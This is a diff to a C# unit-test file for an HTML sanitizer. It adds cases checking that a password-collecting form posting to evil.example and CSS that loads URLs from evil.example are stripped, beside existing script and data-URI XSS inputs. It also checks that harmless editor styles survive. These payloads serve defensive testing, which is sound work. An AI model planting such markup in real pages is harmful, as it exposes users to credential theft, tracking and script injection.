@@ -16,6 +16,10 @@ public class HtmlSanitizerServiceTests
     [InlineData("<svg><script>alert(1)</script></svg>", "<script")]
     [InlineData("<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">x</a>", "data:text/html")]
     [InlineData("<img src=\"data:image/svg+xml;base64,PHN2Zy8+\">", "data:image/svg")]
+    [InlineData("<form action=\"https://evil.example\"><input name=pw></form>", "<form")]
+    [InlineData("<form action=\"https://evil.example\"><input name=pw></form>", "<input")]
+    [InlineData("<p style=\"background:url(https://evil.example/track.png)\">x</p>", "evil.example")]
+    [InlineData("<style>body{background:url(//evil.example/x)}</style><p>y</p>", "<style")]
     public void Removes_active_content(string input, string forbidden)
     {
         var result = Sanitize(input);
@@ -31,6 +35,15 @@ public class HtmlSanitizerServiceTests
         Assert.Contains("<b>world</b>", result);
         Assert.Contains("<li>one</li>", result);
         Assert.Contains("https://example.com", result);
+    }
+
+    [Fact]
+    public void Keeps_harmless_inline_styles_from_the_rich_text_editor()
+    {
+        var result = Sanitize("<p style=\"text-align: center; color: red\">c</p>");
+
+        Assert.Contains("text-align", result);
+        Assert.Contains("color", result);
     }
 
     [Fact]
